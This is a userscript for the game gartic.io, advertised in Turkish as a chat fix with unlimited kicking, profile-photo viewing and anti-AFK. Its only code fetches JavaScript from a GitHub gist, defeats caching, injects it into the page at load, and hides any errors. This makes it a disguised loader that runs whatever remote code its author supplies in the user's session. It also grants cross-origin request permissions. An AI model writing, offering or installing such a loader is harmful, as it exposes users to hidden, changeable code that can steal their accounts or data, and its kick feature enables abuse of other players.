// ==UserScript==
// @name        gartic.io chat fix (by Rüzgar Keskin) - sohbet & sınırsız kick & pp açma özelliği & anti afk
// @namespace    Ha
// @version      1.1
// @description  çalışan tek script. gartic chat fix, sınırsız kick, profil fotoğrafı açma, anti afk blablabla çalışmayan scriptlerle uğraşacağınıza şunu kurun 🥀
// @author       rüzgar keskin (mikey)
// @match        *://gartic.io/*
// @run-at       document-start
// @icon         https://i.pinimg.com/736x/2c/1b/d3/2c1bd3dd605eab4853c0d0cfb89ca804.jpg
// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_xmlhttpRequest
// @grant        GM.xmlHttpRequest
// @connect      r2.dev
// ==/UserScript==
// rüzgar keskin <3
!async function(){let t="https://gist.githubusercontent.com/imgoingtoofast/80f6aa8f4b63de2c507d0b3791cb3c8b/raw/chat.js?t="+new Date().getTime();try{let e=await fetch(t),a=await e.text(),c=document.createElement("script");c.textContent=a,(document.head||document.documentElement).appendChild(c),c.remove()}catch(n){}}();
